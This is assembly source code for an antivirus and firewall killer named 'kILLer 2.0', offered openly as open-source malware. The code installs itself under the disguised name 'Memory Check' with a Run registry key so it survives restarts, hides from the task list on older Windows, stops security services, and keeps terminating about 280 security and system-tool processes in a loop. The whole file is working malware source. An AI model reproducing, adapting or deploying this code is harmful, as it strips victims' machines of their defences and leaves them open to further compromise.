

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                     kILLer vers. 2.0                        ;
;                 coded 6/15/02 in assembly                   ;
;                       by: illwill                           ;
;                    http://www.illmob.org                    ;
;         This app will kill over 280 av's and firewalls      ;
;         and restart with windows  for win98/me/nt/2k/xp     ;
; This app is open source if you use any part of it your code ;
;      just give my ass a shout-out in the credits :)         ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.386                               
.model flat, stdcall
option casemap:none

include C:\masm32\include\kernel32.inc
include C:\masm32\include\user32.inc
include C:\masm32\include\windows.inc
include C:\masm32\include\shell32.inc
includelib C:\masm32\lib\kernel32.lib
includelib C:\masm32\lib\user32.lib
includelib C:\masm32\lib\shell32.lib
include \masm32\include\advapi32.inc
includelib \masm32\lib\advapi32.lib

; Prototypes
Stripper PROTO :DWORD, :DWORD
NukeEm  PROTO :DWORD

; Data structures
PROCESSENTRY32 STRUCT
    dwSize              DWORD ?
    cntUsage            DWORD ?
    th32ProcessID       DWORD ?
    th32DefaultHeapID   DWORD ?
    th32ModuleID        DWORD ?
    cntThreads          DWORD ?
    th32ParentProcessID DWORD ?
    pcPriClassBase      DWORD ?
    dwFlags             DWORD ?
    szExeFile           BYTE MAX_PATH dup(?)
PROCESSENTRY32 ENDS


.data
szAvFw BYTE 0
       BYTE "_AVPCC.EXE",0,"_AVPM.EXE",0,"AGENTSVR.EXE",0,"ALOGSERV.EXE",0
       BYTE "ANTI-TROJAN.EXE",0,"ANTIVIRUS.EXE",0,"ANTS.EXE",0
       BYTE "APIMONITOR.EXE",0,"APLICA32.EXE",0,"APVXDWIN.EXE",0,"ATCON.EXE",0,"ATGUARD.EXE",0
       BYTE "ATRO55EN.EXE",0,"ATUPDATER.EXE",0,"ATWATCH.EXE",0,"AUPDATE.EXE",0,"AUTOUPDATE.EXE",0
       BYTE "AVCONSOL.EXE",0,"AVGSERV9.EXE",0,"AVP.EXE",0,"AVP32.EXE",0,"AVPCC.EXE",0
       BYTE "AVPM.EXE",0,"AVSYNMGR.EXE",0,"BD_PROFESSIONAL.EXE",0,"BIDEF.EXE",0
       BYTE "BIDSERVER.EXE",0,"BIPCP.EXE",0,"BIPCPEVALSETUP.EXE",0,"BISP.EXE",0
       BYTE "BLACKD.EXE",0,"BLACKICE.EXE",0,"BOOTWARN.EXE",0,"BORG2.EXE",0,"BS120.EXE",0
       BYTE "CDP.EXE",0,"CFGWIZ.EXE",0,"CFIADMIN.EXE",0,"CFIAUDIT.EXE",0
       BYTE "CFINET.EXE",0,"CFINET32.EXE",0,"CLEAN.EXE",0,"CLEANER.EXE",0
       BYTE "CLEANER3.EXE",0,"CLEANPC.EXE",0,"CMGRDIAN.EXE",0,"CMON016.EXE",0,"CPD.EXE",0
       BYTE "CFGWIZ.EXE",0,"CFIADMIN.EXE",0,"CFIAUDIT.EXE",0,"CFINET.EXE",0
       BYTE "CFINET32.EXE",0,"CLEAN.EXE",0,"CLEANER.EXE",0,"CLEANER3.EXE",0,"CLEANPC.EXE",0
       BYTE "CMGRDIAN.EXE",0,"CMON016.EXE",0,"CPF9X206.EXE",0,"CPFNT206.EXE",0,"CV.EXE",0
       BYTE "CWNB181.EXE",0,"CWNTDWMO.EXE",0,"DEFWATCH.EXE",0,"DEPUTY.EXE",0,"DPF.EXE",0
       BYTE "DPFSETUP.EXE",0,"DRWATSON.EXE",0,"DRWEB32.EXE",0,"ENT.EXE",0
       BYTE "ESCANH95.EXE",0,"ESCANHNT.EXE",0,"ESCANV95.EXE",0,"EXANTIVIRUS-CNET.EXE",0
       BYTE "FAST.EXE",0,"FIREWALL.EXE",0,"FLOWPROTECTOR.EXE",0,"FP-WIN_TRIAL.EXE",0
       BYTE "FRW.EXE",0,"FSAV.EXE",0,"FSAV530STBYB.EXE",0,"FSAV530WTBYB.EXE",0
       BYTE "FSAV95.EXE",0,"GBMENU.EXE",0,"GBPOLL.EXE",0,"GUARD.EXE",0
       BYTE "GUARDDOG.EXE",0,"HACKTRACERSETUP.EXE",0,"HTLOG.EXE",0,"HWPE.EXE",0
       BYTE "IAMAPP.EXE",0,"IAMAPP.EXE",0,"IAMSERV.EXE",0,"ICLOAD95.EXE",0
       BYTE "ICLOADNT.EXE",0,"ICMON.EXE",0,"ICSUPP95.EXE",0,"ICSUPPNT.EXE",0
       BYTE "IFW2000.EXE",0,"IPARMOR.EXE",0,"IRIS.EXE",0,"JAMMER.EXE",0
       BYTE "KAVLITE40ENG.EXE",0,"KAVPERS40ENG.EXE",0,"KERIO-PF-213-EN-WIN.EXE",0
       BYTE "KERIO-WRL-421-EN-WIN.EXE",0,"KERIO-WRP-421-EN-WIN.EXE",0,"KILLPROCESSSETUP161.EXE",0
       BYTE "LDPRO.EXE",0,"LOCALNET.EXE",0,"LOCKDOWN.EXE",0,"LOCKDOWN2000.EXE",0
       BYTE "LSETUP.EXE",0,"LUALL.EXE",0,"LUAU.EXE",0,"LUCOMSERVER.EXE",0
       BYTE "LUINIT.EXE",0,"MCAGENT.EXE",0,"MCUPDATE.EXE",0,"MFW2EN.EXE",0
       BYTE "MFWENG3.02D30.EXE",0,"MGUI.EXE",0,"MINILOG.EXE",0,"MOOLIVE.EXE",0
       BYTE "MRFLUX.EXE",0,"MSCONFIG.EXE",0,"MSINFO32.EXE",0,"MSSMMC32.EXE",0
       BYTE "MU0311AD.EXE",0,"NAV80TRY.EXE",0,"NAVAPW32.EXE",0,"NAVDX.EXE",0
       BYTE "NAVSTUB.EXE",0,"NAVW32.EXE",0,"NC2000.EXE",0,"NCINST4.EXE",0
       BYTE "NDD32.EXE",0,"NEOMONITOR.EXE",0,"NETARMOR.EXE",0,"NETINFO.EXE",0
       BYTE "NETMON.EXE",0,"NETSCANPRO.EXE",0,"NETSPYHUNTER-1.2.EXE",0,"NETSTAT.EXE",0
       BYTE "NISSERV.EXE",0,"NISUM.EXE",0,"NMAIN.EXE",0,"NORTON_INTERNET_SECU_3.0_407.EXE",0
       BYTE "NPF40_TW_98_NT_ME_2K.EXE",0,"NPFMESSENGER.EXE",0,"NPROTECT.EXE",0
       BYTE "NSCHED32.EXE",0,"NTVDM.EXE",0,"NVARCH16.EXE",0,"NWINST4.EXE",0,"NWTOOL16.EXE",0
       BYTE "OSTRONET.EXE",0,"OUTPOST.EXE",0,"OUTPOSTINSTALL.EXE",0,"OUTPOSTPROINSTALL.EXE",0
       BYTE "PADMIN.EXE",0,"PANIXK.EXE",0,"PAVPROXY.EXE",0,"PCC2002S902.EXE",0
       BYTE "PCC2K_76_1436.EXE",0,"PCCIOMON.EXE",0,"PCDSETUP.EXE",0,"PCFWALLICON.EXE",0
       BYTE "PCFWALLICON.EXE",0,"PCIP10117_0.EXE",0,"PDSETUP.EXE",0,"PERISCOPE.EXE",0
       BYTE "PERSFW.EXE",0,"PF2.EXE",0,"PFWADMIN.EXE",0,"PINGSCAN.EXE",0
       BYTE "PLATIN.EXE",0,"POPROXY.EXE",0,"POPSCAN.EXE",0,"PORTDETECTIVE.EXE",0
       BYTE "PPINUPDT.EXE",0,"PPTBC.EXE",0,"PPVSTOP.EXE",0,"PROCEXPLORERV1.0.EXE",0
       BYTE "PROPORT.EXE",0,"PROTECTX.EXE",0,"PSPF.EXE",0,"PURGE.EXE",0
       BYTE "PVIEW95.EXE",0,"QCONSOLE.EXE",0,"QSERVER.EXE",0,"RAV8WIN32ENG.EXE",0
       BYTE "REGEDT32.EXE",0,"REGEDIT.EXE",0,"RESCUE.EXE",0,"RESCUE32.EXE",0
       BYTE "RRGUARD.EXE",0,"RSHELL.EXE",0,"RTVSCN95.EXE",0,"RULAUNCH.EXE",0,"SAFEWEB.EXE",0
       BYTE "SBSERV.EXE",0,"SD.EXE",0,"SETUP_FLOWPROTECTOR_US.EXE",0,"SETUPVAMEEVAL.EXE",0
       BYTE "SFC.EXE",0,"SGSSFW32.EXE",0,"SH.EXE",0,"SHELLSPYINSTALL.EXE",0,"SHN.EXE",0
       BYTE "SMC.EXE",0,"SOFI.EXE",0,"SPF.EXE",0,"SPHINX.EXE",0,"SPYXX.EXE",0,"SS3EDIT.EXE",0
       BYTE "ST2.EXE",0,"SUPFTRL.EXE",0,"SUPPORTER5.EXE",0,"SYMPROXYSVC.EXE",0,"SYSEDIT.EXE",0
       BYTE "TASKMON.EXE",0,"TAUMON.EXE",0,"TAUSCAN.EXE",0,"TC.EXE",0,"TCA.EXE",0,"TCM.EXE",0
       BYTE "TDS2-98.EXE",0,"TDS2-NT.EXE",0,"TDS-3.EXE",0,"TFAK5.EXE",0,"TGBOB.EXE",0
       BYTE "TITANIN.EXE",0,"TITANINXP.EXE",0,"TRACERT.EXE",0,"TRJSCAN.EXE",0,"TRJSETUP.EXE",0
       BYTE "TROJANTRAP3.EXE",0,"UNDOBOOT.EXE",0,"UPDATE.EXE",0,"VBCMSERV.EXE",0,"VBCONS.EXE",0
       BYTE "VBUST.EXE",0,"VBWIN9X.EXE",0,"VBWINNTW.EXE",0,"VCSETUP.EXE",0,"VFSETUP.EXE",0
       BYTE "VIRUSMDPERSONALFIREWALL.EXE",0,"VNLAN300.EXE",0,"VNPC3000.EXE",0,"VPC42.EXE",0
       BYTE "VPFW30S.EXE",0,"VPTRAY.EXE",0,"VSCENU6.02D30.EXE",0,"VSECOMR.EXE",0
       BYTE "VSHWIN32.EXE",0,"VSISETUP.EXE",0,"VSMAIN.EXE",0,"VSMON.EXE",0,"VSSTAT.EXE",0
       BYTE "VSWIN9XE.EXE",0,"VSWINNTSE.EXE",0,"VSWINPERSE.EXE",0,"W32DSM89.EXE",0,"W9X.EXE",0
       BYTE "WATCHDOG.EXE",0,"WEBSCANX.EXE",0,"WGFE95.EXE",0,"WHOSWATCHINGME.EXE",0
       BYTE "WHOSWATCHINGME.EXE",0,"WINRECON.EXE",0,"WNT.EXE",0,"WRADMIN.EXE",0,"WRCTRL.EXE",0
       BYTE "WSBGATE.EXE",0,"WYVERNWORKSFIREWALL.EXE",0,"XPF202EN.EXE",0,"ZAPRO.EXE",0
       BYTE "ZAPSETUP3001.EXE",0,"ZATUTOR.EXE",0,"ZAUINST.EXE",0,"ZONALM2601.EXE",0,"ZONEALARM.EXE",0,0,0
;#########################################################################################################
;services for nt/2k/xp
   NTStop       db 'NET STOP NAVAPSVC',0
   KasStop      db 'NET STOP AVPCC',0
   TinyStop     db 'NET STOP PERSFW',0
;#########################################################################################################
   hSnapshot  DWORD 0
   kernel32   db 'kernel32.dll', 0
   func       db 'RegisterServiceProcess', 0
   szKey      db "SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0
   szValue    db "Memory Check",0,16 dup(0)
   slash      db "\",0
   exename    db "MemChk.exe",0,16 dup(0)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.data?
  exebuff2     db 256 dup(?)
   hReg        dd ?
   windir      db 256 dup(?)
.code
Start:
invoke GetWindowsDirectory, addr windir, sizeof windir
invoke lstrcat,addr windir,addr slash
invoke lstrcat,addr windir,addr exename
invoke GetModuleFileName, 0, addr exebuff2, sizeof exebuff2
invoke CopyFile, addr exebuff2, addr windir, 0
invoke RegOpenKeyEx, 80000002h, addr szKey, 0, 00020000h+0002h+0004h, addr hReg
invoke RegSetValueEx, hReg, ADDR szValue, 0, 1, addr windir, eax
invoke RegCloseKey, hReg
check:
    invoke GetModuleHandle, addr kernel32
    invoke GetProcAddress, eax, addr func
    test eax,eax
    jz itsNT      ;if NT skip the hide from ctrl-alt-del
    push 1
    push 0
    call eax
    jmp KillemAll
itsNT:
invoke WinExec,addr NTStop, SW_HIDE
invoke WinExec,addr TinyStop, SW_HIDE
invoke WinExec,addr KasStop, SW_HIDE
KillemAll:
   lea esi, szAvFw
@@:  
   lodsb
   test al, al
   jnz @b
   mov al, BYTE PTR [esi]
   test al, al
   jz ListDone
   invoke NukeEm, esi
   jmp @b
ListDone:
invoke	Sleep, 5000
jmp check


; Get process list, kill all processes
NukeEm proc szApp:DWORD
   LOCAL Process:PROCESSENTRY32
   LOCAL szFilename[MAX_PATH]:BYTE
	
   mov Process.dwSize, SIZEOF Process
   invoke CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0
   mov hSnapshot, eax                    
   mov edi, szApp
   invoke Process32First, hSnapshot, ADDR Process

MurderLoop:
      invoke Stripper, ADDR Process.szExeFile, ADDR szFilename
      invoke lstrcmpiA, edi, ADDR szFilename
      test eax, eax
      jnz Continue
	   invoke OpenProcess, PROCESS_TERMINATE, 0, Process.th32ProcessID 
	   invoke TerminateProcess, eax, 0
	   invoke Sleep, 100
Continue:
	   invoke Process32Next, hSnapshot, ADDR Process
	   test eax, eax
	   jz AllDone
	   jmp MurderLoop
AllDone:
   invoke CloseHandle, [hSnapshot]
	ret
NukeEm endp

Stripper PROC full:DWORD, stripped:DWORD
   push esi
   push edi
   push ebx
   push eax
   
   mov esi, full
   mov ebx, esi
  
@@:
   lodsb
   cmp al, 0
   je EOF
   cmp al, '\'
   jne @b
   mov ebx, esi      ; save pointer to last found backslash
   jmp @b
   
EOF:
   mov edi, stripped
   mov esi, ebx
@@:
   lodsb
   stosb
   cmp al, 0
   jne @b
  
   pop eax
   pop ebx
   pop edi
   pop esi
   ret
Stripper ENDP

end Start
